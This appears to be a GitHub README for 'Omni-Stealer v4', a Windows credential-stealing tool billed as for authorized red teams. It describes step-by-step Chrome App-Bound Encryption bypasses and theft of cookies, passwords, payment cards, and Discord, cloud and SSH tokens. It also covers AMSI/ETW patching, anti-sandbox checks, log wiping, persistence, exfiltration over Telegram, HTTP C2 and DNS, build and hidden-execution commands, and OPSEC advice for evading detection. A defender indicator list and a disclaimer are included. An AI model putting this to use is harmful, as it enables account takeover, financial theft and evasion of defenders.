# Omni-Stealer v4 — APEX

> **Advanced Browser Credential & Session Extraction Framework**  
> *For Authorized Penetration Testing & Red Team Operations*

<p align="center">
  <img src="https://img.shields.io/badge/version-4.0-red" alt="Version 4.0">
  <img src="https://img.shields.io/badge/platform-Windows-blue" alt="Platform Windows">
  <img src="https://img.shields.io/badge/python-3.10%2B-brightgreen" alt="Python 3.10+">
  <img src="https://img.shields.io/badge/license-MIT-yellow" alt="License MIT">
  <img src="https://img.shields.io/badge/chrome%20bypass-v20%20ABE-success" alt="Chrome v20 ABE Bypass">
</p>

---

## Overview

Omni-Stealer v4 is a **post-exploitation credential assessment tool** designed for authorized red teams to evaluate the security of browser-stored secrets on Windows endpoints. It demonstrates and bypasses modern Chromium encryption protections — including Google Chrome's **Application-Bound Encryption (ABE)** introduced in Chrome 127 — and extracts session cookies, saved credentials, payment data, and authentication tokens through a single portable executable.

**What makes this different:** Three distinct, production-tested bypass techniques against Chrome v20 ABE, combined with enterprise-grade evasion, multi-channel exfiltration, and complete anti-forensic cleanup — all in one self-contained payload.

---

## Features

### Data Extraction

| Category | Details |
|---|---|
| **Session Cookies** | All HTTP/HTTPS cookies including `HttpOnly` and `Secure` flags |
| **Saved Passwords** | Credentials from built-in browser password managers |
| **Credit Cards** | Stored payment card information and autofill data |
| **Browsing History** | Last 500 visited URLs with visit timestamps |
| **Discord Tokens** | Authentication tokens from Discord, Discord PTB, Discord Canary |
| **Session Tokens** | AWS keys, GitHub/GitLab tokens, Slack tokens, JWTs, SSH keys, `.env` secrets |

### ABE v20 Bypass Techniques

| # | Technique | Privilege | Stealth | Reliability |
|---|---|---|---|---|
| 1 | **Registry Policy Disable** — Set `ApplicationBoundEncryptionEnabled=0` via group policy | Admin | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 2 | **CDP Remote Debugging** — Launch headless browser, call `Network.getAllCookies` via DevTools Protocol | User | ⭐⭐ | ⭐⭐⭐⭐ |
| 3 | **COM IElevator** — Call `DecryptData` on Chrome's Elevation Service via COM interface | User | ⭐⭐⭐⭐ | ⭐⭐⭐ |

### Evasion & Anti-Forensics

- **Anti-Sandbox**: 10-point heuristic detection (BIOS, CPU, disk, RAM, processes, uptime, usernames, hostnames, MAC OUI, sleep acceleration)
- **Anti-Debug**: `IsDebuggerPresent` check + hardware breakpoint detection (DR0-DR3)
- **AMSI Bypass**: Patches `AmsiScanBuffer` → always returns `AMSI_RESULT_CLEAN`
- **ETW Bypass**: Patches `EtwEventWrite` → disables Windows telemetry
- **Forensic Cleanup**: Clears Event Logs (System/Security/Application), Prefetch, Jump Lists, Windows Inventory, Registry MRU
- **Self-Deletion**: Delayed process removal via PowerShell script

### Exfiltration Channels

| Channel | Protocol | Use |
|---|---|---|
| **Telegram Bot** | HTTPS multipart/form-data | Primary — messages + file uploads |
| **HTTP C2** | JSON POST | Secondary — full structured data |
| **DNS** | TXT via subdomain | Beaconing / heartbeat only |

### Persistence

- Registry Run Key (`HKCU\...\Run`)
- Scheduled Task (`onlogon`)
- Startup Folder copy

---

## Supported Browsers

| Browser | v10 (DPAPI) | v11 (AES-GCM) | v20 (ABE) | Notes |
|---|---|---|---|---|
| **Google Chrome** | ✅ | ✅ | ✅ | Full support, all bypass methods |
| **Microsoft Edge** | ✅ | ✅ | ✅ | Full support (Chromium-based) |
| **Brave** | ✅ | ✅ | ✅ | Full support (Chromium-based) |
| **Vivaldi** | ✅ | ✅ | ⚠️ | Partial — CDP bypass recommended |
| **Opera** | ✅ | ✅ | ❌ | v11 encryption only |
| **Opera GX** | ✅ | ✅ | ❌ | v11 encryption only |
| **Firefox** | ❌ | ❌ | ❌ | Different architecture (not supported) |

---

## Quick Start

### Requirements (Build Machine)

- **OS**: Windows 10/11 x64
- **Python**: 3.10+
- **Pip packages**: `pywin32`, `cryptography`, `pyinstaller`, `comtypes`

### Installation

```powershell
# Clone
git clone https://github.com/tanvirahmedcs/OMNI-STEALER.git
cd OMNI-STEALER

# Install dependencies
pip install -r requirements.txt

# Verify environment
python -c "import win32crypt; from cryptography.hazmat.primitives.ciphers.aead import AESGCM; import comtypes; print('All dependencies OK')"
```

### Building the Payload

```powershell
# Interactive mode (prompts for Telegram credentials)
python omni_stealer_builder.py

# Command-line mode
python omni_stealer_builder.py "<BOT_TOKEN>" "<CHAT_ID>"

# With optional HTTP C2
python omni_stealer_builder.py "<BOT_TOKEN>" "<CHAT_ID>" "https://your-c2.com/api/collect"

# Using environment variables
set TELEGRAM_BOT_TOKEN=your_token
set TELEGRAM_CHAT_ID=your_chat_id
python omni_stealer_v4.py
```

On success, `ApexStealer.exe` appears in the current directory.

### Deployment

```powershell
# Direct execution
.\ApexStealer.exe

# Silent execution (no window)
Start-Process -WindowStyle Hidden -FilePath .\ApexStealer.exe
```

---

## How It Works

### Chrome Encryption Evolution

```
Pre-Chrome 80     → DPAPI only              → v10 prefix
Chrome 80-126     → DPAPI + AES-256-GCM     → v11 prefix
Chrome 127+       → DPAPI + AES-256-GCM     
                    + App-Bound Encryption  → v20 prefix
```

### Bypass Execution Flow

```
┌──────────────────────────────────────────────────────────┐
│                    EXECUTION START                       │
├──────────────────────────────────────────────────────────┤
│  1. Anti-Analysis Checks                                 │
│     ├─ Sandbox/VM detection (10 methods)                 │
│     ├─ Debugger detection                                │
│     └─ Exit if detected                                  │
├──────────────────────────────────────────────────────────┤
│  2. AMSI + ETW Patching                                  │
├──────────────────────────────────────────────────────────┤
│  3. Payload Jitter (0-5s random delay)                   │
├──────────────────────────────────────────────────────────┤
│  4. For Each Browser:                                    │
│     ├─ Read Local State                                  │
│     ├─ v10/v11? → DPAPI → AES-GCM → plaintext           │
│     ├─ v20 ABE detected? → Pipeline:                    │
│     │   ├─[Admin?] Registry Policy Disable               │
│     │   ├─ CDP Remote Debugging (WebSocket)              │
│     │   └─ COM IElevator DecryptData                     │
│     └─ Extract cookies, passwords, cards, history        │
├──────────────────────────────────────────────────────────┤
│  5. Discord Token Extraction                             │
│  6. Session Token Hunting (AWS, GitHub, SSH, etc.)       │
├──────────────────────────────────────────────────────────┤
│  7. Build Reports (TXT + JSON)                           │
├──────────────────────────────────────────────────────────┤
│  8. Exfiltration                                         │
│     ├─ Telegram (file + summary + domain breakdown)      │
│     ├─ HTTP C2 (full JSON dump)                          │
│     └─ DNS (beacon only)                                 │
├──────────────────────────────────────────────────────────┤
│  9. Forensic Cleanup                                     │
│     ├─ Delete report files                               │
│     ├─ Clear event logs                                  │
│     ├─ Clear prefetch / jumplists / MRU                  │
│     └─ Self-destruct (PowerShell delayed deletion)       │
└──────────────────────────────────────────────────────────┘
```

### CDP Remote Debugging Bypass (Detail)

This is the most practical user-mode bypass:

```
1. Spawn: chrome.exe --headless --remote-debugging-port=XXXX 
                     --user-data-dir=CUSTOM_TEMP --no-sandbox
2. GET http://127.0.0.1:XXXX/json/version → webSocketDebuggerUrl
3. POST to devtools endpoint with:
      {"id":1, "method":"Network.getAllCookies", "params":{}}
4. Receive JSON response with all cookies in plaintext
```

Chrome decrypts them internally — we just ask via its own API.

### COM IElevator Bypass (Detail)

Direct key extraction via Chrome's Elevation Service:

```
1. Read app_bound_encrypted_key from Local State
2. CoCreateInstance(CLSID_Elevator) — must run from Chrome directory
3. Call IElevator::DecryptData(encoded_key_blob)
4. Receive 32-byte AES master key
5. Decrypt cookies from SQLite database directly
```

---

## Project Structure

```
omni-stealer-v4/
├── omni_stealer_v4.py      # Builder script + embedded payload
├── requirements.txt         # Python dependencies
├── README.md               # This file
├── CHANGELOG.md            # Version history
├── docs/
│   ├── TECHNICAL_DEEP_DIVE.md   # Full technical analysis
│   ├── ABE_RESEARCH.md          # App-Bound Encryption internals
│   └── OPSEC_GUIDE.md          # Operational security recommendations
└── tools/
    └── decrypt_key.py           # Standalone ABE key decryption utility
```

---

## Configuration Reference

Edit these constants at the top of `omni_stealer_v4.py` before building:

| Constant | Default | Description |
|---|---|---|
| `TELEGRAM_BOT_TOKEN` | `""` | Telegram bot token (or use env/input) |
| `TELEGRAM_CHAT_ID` | `""` | Telegram chat ID (or use env/input) |
| `C2_SERVER_URL` | `""` | Optional HTTP C2 endpoint |
| `DNS_C2_DOMAIN` | `""` | Optional DNS exfiltration domain |
| `OUTPUT_EXE_NAME` | `"ApexStealer.exe"` | Output executable name |
| `SANDBOX_CHECK` | `True` | Enable/disable sandbox detection |
| `VM_CHECK` | `True` | Enable/disable VM detection |
| `DEBUGGER_CHECK` | `True` | Enable/disable debugger detection |
| `MAX_SLEEP_JITTER` | `5` | Max random delay (seconds) |

---

## Operational Security (OPSEC)

### Recommended Practices

1. **Disposable Telegram Bot** — Create a new bot via @BotFather per operation; revoke afterwards
2. **Self-Hosted C2** — For HTTP exfiltration, use a domain you control with HTTPS
3. **Remove Build Artifacts** — Strip timestamps, paths, debug symbols from the EXE
4. **Pack/Compress** — Use UPX or similar to reduce binary entropy signature
5. **Stage via Dropper** — Don't transfer the raw EXE over monitored channels
6. **Time Execution** — Run during expected activity windows to blend with traffic

### Known Indicators (for Defenders)

**Network:**
- `POST` to `api.telegram.org` with `multipart/form-data` containing `.txt` or `.json`
- Connections to `127.0.0.1:9222`-`9299` from non-browser parent processes
- DNS queries with long random hex subdomains

**Process:**
- `chrome.exe` or `msedge.exe` with flags: `--headless`, `--remote-debugging-port=`, `--user-data-dir=`, `--no-sandbox`
- PyInstaller-packed binaries (identifiable by `_MEI` temp directory artifacts)

**File System:**
- SQLite database copies with `.tmp` suffix in browser profile directories
- Temp directories named `omni_*` or `_MEI*`

**Registry:**
- `HKLM\Software\Policies\Google\Chrome\ApplicationBoundEncryptionEnabled = 0`
- `HKLM\Software\Policies\Microsoft\Edge\ApplicationBoundEncryptionEnabled = 0`

---

## Detection & Mitigation (Blue Team Reference)

| Layer | Control | Effectiveness |
|---|---|---|
| **EDR** | Alert on `--remote-debugging-port` in browser command lines | High |
| **Network** | Block `api.telegram.org` for non-browser processes | Medium |
| **Network** | Alert on long subdomain DNS queries (DNS exfil pattern) | Medium |
| **Browser Policy** | Enforce `ApplicationBoundEncryptionEnabled=1` via GPO | Prevents reg bypass |
| **App Control** | WDAC/AppLocker restricting unsigned executables | High |
| **Chrome 136+** | Requires `--user-data-dir` alongside `--remote-debugging-port` | Mitigation in progress |
| **Behavioral** | Monitor for `chrome.exe` spawning from non-browser parents | High |
| **Logging** | Enable PowerShell script block logging for self-delete detection | Medium |
| **SIEM** | Alert on `wevtutil cl` commands clearing Security log | Medium |

---

## Changelog

### v4.0 — APEX Edition (Current)

- Complete architecture rewrite
- Three ABE v20 bypass techniques (CDP, COM, Registry Policy)
- Anti-sandbox detection (10 heuristics)
- Anti-debug detection (PEB + hardware breakpoints)
- AMSI + ETW runtime patching
- Credit card and autofill extraction
- Discord token extraction
- Session token hunting (AWS, GitHub, Slack, JWT, SSH, .env)
- HTTP C2 and DNS exfiltration channels
- 3-method persistence (Registry, Task Scheduler, Startup Folder)
- Full forensic cleanup (Event Logs, Prefetch, Jump Lists, MRU)
- PowerShell-based self-deletion
- Multi-profile support for all Chromium browsers
- Structured JSON report output alongside text format

### v3.0

- Initial release — DPAPI + AES-GCM extraction
- Chrome, Edge, Opera support
- Telegram exfiltration
- Single-profile extraction

---

## Legal & Ethical Use

```
MIT License

Copyright (c) 2024-2026 Omni-Stealer Project

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files ...

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
```

**This tool is strictly for authorized penetration testing, red team exercises, and security research.**  
Users must obtain explicit written permission before testing any system they do not own. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) in the US, the Computer Misuse Act in the UK, and similar laws worldwide. The developers assume no liability and will not support malicious use.

<p align="center">
  <sub>Built for authorized security assessments. Know your target, have permission, stay legal.</sub>
</p>
